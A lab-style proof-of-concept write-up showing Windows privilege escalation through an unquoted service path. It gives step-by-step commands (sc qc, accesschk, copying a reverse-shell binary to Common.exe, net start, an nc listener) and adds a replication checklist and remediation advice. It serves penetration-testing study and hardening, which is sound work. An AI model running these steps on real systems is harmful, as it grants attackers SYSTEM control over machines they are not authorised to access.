# Proof of Concept: Privilege Escalation via Unquoted Service Path

### Vulnerability Overview

**Unquoted Service Path** is a Windows privilege escalation vulnerability where a service's `ImagePath` in the registry is unquoted and contains spaces (e.g., `C:\Program Files\MyService\MyService.exe`). Windows misinterprets the path, attempting to execute intermediate paths first (e.g., `C:\Program.exe`). If an attacker has write access to any directory in the path, they can place a malicious file in an intermediate location, which Windows will execute instead of the intended binary, potentially leading to privilege escalation.

---

### Proof of Concept (PoC)

This PoC demonstrates how a low-privileged user can exploit the "Unquoted Service Path" vulnerability to escalate privileges on a Windows machine. The test was conducted as a white box assessment, with prior knowledge of login credentials and the vulnerable service (`unquotedsvc`). The process involves gaining initial access, identifying the unquoted service path, checking write permissions on directories in the path, placing a malicious file in an intermediate directory, and starting the service to gain an elevated shell.

#### Initial Access
- Logged into the target Windows machine using provided credentials for the user account `user`.  
- Established a reverse shell to connect to the attacker machine for command execution, using a malicious file (`esc.exe`).  
  - **Screenshot**: Initial Access via Reverse Shell  
    ![Initial Access](https://github.com/user-attachments/assets/fe04b6c1-5d47-4c47-8962-36829a605259)

#### Step 1: Query the Vulnerable Service
- Queried the service `unquotedsvc` to check its configuration and confirm the vulnerability:  
  ```bash
  sc qc unquotedsvc
  ```
- **Result**: The `BINARY_PATH_NAME` was `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`, and it was unquoted with spaces, confirming the vulnerability.  
  - **Screenshot**: Service Configuration  
    ![Service Details](https://github.com/user-attachments/assets/93d30514-dfec-430c-b61e-725667e976d3)

#### Step 2: Check Write Permissions on Directories in the Path
- Analyzed write permissions on directories in the service path to identify exploitable locations:  
  ```bash
  C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:"
  ```
  ```bash
  C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\"
  ```
  ```bash
  C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
  ```
  - **Command Breakdown**:  
    - `/accepteula`: Auto-accepts the EULA.  
    - `-u`: Checks user-level access.  
    - `-w`: Checks for write permissions.  
    - `-d`: Targets directories only.  
    - `-q`: Quiet mode, suppresses banners.  

- **Result**: The directory `C:\Program Files\Unquoted Path Service\` grants `RW BUILTIN\Users`, meaning all authenticated users (including `user`) can read and write to this directory.  
  - **Screenshot**: Permission Results  
    ![Permission Results](https://github.com/user-attachments/assets/c682213c-53f1-464b-845f-5379b6fe8fd8)

#### Step 3: Exploit the Vulnerability
- **Objective**: Place a malicious file in an intermediate directory that Windows will attempt to execute due to the unquoted path.  
  - Path: `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`.  
  - Intermediate path Windows will try: `C:\Program Files\Unquoted Path Service\Common.exe` (due to the space after "Common").  
- Copied the malicious file `esc.exe` (a reverse shell binary) to the intermediate location:  
  ```bash
  copy C:\users\user\esc.exe "C:\Program Files\Unquoted Path Service\Common.exe"
  ```
  - **Screenshot**: File Copy Success  
    ![File Copy](https://github.com/user-attachments/assets/1828b0f0-c8d2-4a76-ae70-41dfb65ecd6d)

#### Step 4: Trigger the Malicious File and Gain Elevated Shell
- Started the service to trigger the execution of the malicious file:  
  ```bash
  net start unquotedsvc
  ```
- **Result**: Windows executed `C:\Program Files\Unquoted Path Service\Common.exe` (the malicious `esc.exe`) instead of the intended binary, establishing a reverse shell with `SYSTEM` privileges on the attacker machine.  
  - **Screenshot**: Elevated Shell via Reverse Shell  
    ![Elevated Shell](https://github.com/user-attachments/assets/3bad4c77-63c4-4a8c-a12b-1a7e35562ff5)

---

### Summary of Findings

- The `unquotedsvc` service had an unquoted `ImagePath` with spaces (`C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`).  
- The directory `C:\Program Files\Unquoted Path Service\` was writable by `BUILTIN\Users`, allowing the placement of a malicious file (`Common.exe`).  
- Starting the service caused Windows to execute the malicious file instead of the intended binary, resulting in a `SYSTEM`-level reverse shell.

---


Below is a concise summary of the steps taken in the "Unquoted Service Path" Proof of Concept (PoC), presented as a checklist that can be used to replicate the privilege escalation attack on a Windows machine. The checklist is streamlined for clarity and focuses on the key actions required to exploit the vulnerability.

---

## Checklist: Replicating Unquoted Service Path Privilege Escalation Attack

### Prerequisites
- [ ] Gain initial access to the target Windows machine using valid user credentials.
- [ ] Set up a listener on the attacker machine to capture reverse shell connections (e.g., `nc -nlvp <port>`).
- [ ] Prepare a malicious file (`esc.exe`) that establishes a reverse shell, hosted at an accessible location (e.g., `C:\users\user\esc.exe`).

---

### Steps to Exploit Unquoted Service Path
**Target**: Exploit the unquoted service path vulnerability in the `unquotedsvc` service to execute a malicious binary.

- [ ] Establish a reverse shell to the attacker machine (listener already set up).
- [ ] Query the service to confirm the unquoted path vulnerability:  
  `sc qc unquotedsvc`
- [ ] Check write permissions on directories in the service path:  
  `C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:"`  
  `C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\"`  
  `C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"`
- [ ] Place the malicious file in an intermediate directory Windows will execute:  
  `copy C:\users\user\esc.exe "C:\Program Files\Unquoted Path Service\Common.exe"`
- [ ] Start the service to trigger the malicious file and gain a reverse shell:  
  `net start unquotedsvc`

---

### Notes
- Ensure the malicious file (`esc.exe`) is accessible on the target system (e.g., at `C:\users\user\esc.exe`).
- The intermediate file name (`Common.exe`) must match the next segment after a space in the unquoted path (e.g., `Common` from `Common Files`).
- The `accesschk.exe` tool must be available on the target system (e.g., at `C:\PrivEsc\accesschk.exe`).
- The service restart triggers the exploit by executing the malicious file with `SYSTEM` privileges.



### Conclusion

This PoC confirms that the "Unquoted Service Path" vulnerability in the `unquotedsvc` service allows a low-privileged user to escalate privileges to `SYSTEM` level. By exploiting the unquoted path and writable directory permissions, an attacker can place a malicious file in an intermediate path that Windows executes with elevated privileges, posing a significant risk to system security. Immediate remediation is recommended, such as quoting service paths in the registry and restricting write permissions on directories in service paths.

---









